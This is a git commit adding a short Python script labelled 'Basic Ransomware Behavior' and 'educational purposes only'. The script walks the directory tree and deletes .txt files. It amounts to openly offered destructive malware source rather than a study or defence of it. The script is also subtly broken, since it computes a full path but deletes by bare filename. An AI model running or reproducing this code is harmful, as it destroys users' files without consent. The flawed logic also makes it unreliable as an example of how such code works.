a51a811340533aefe81176e33b9190ccc890dea5
fpineda1410 <fpineda147@outlook.com>
2021-06-01 09:18:59 -0600

    first commit

---
+++ main.py
@@ -0,0 +1,16 @@
+import os
+import fnmatch
+
+'''Basic Ransomware Behavior
+
+A ransomware is a script or set of instructions that is designed to acces files in the host
+and modify them for malicious purposes
+
+#EDUCATIONAL PURPOSES ONLY
+
+'''
+for path,dirs,files in os.walk('.'):
+    for f in fnmatch.filter(files,'*.txt'):
+        fullname = os.path.abspath(os.path.join(path,f))
+        os.remove(f)
+        
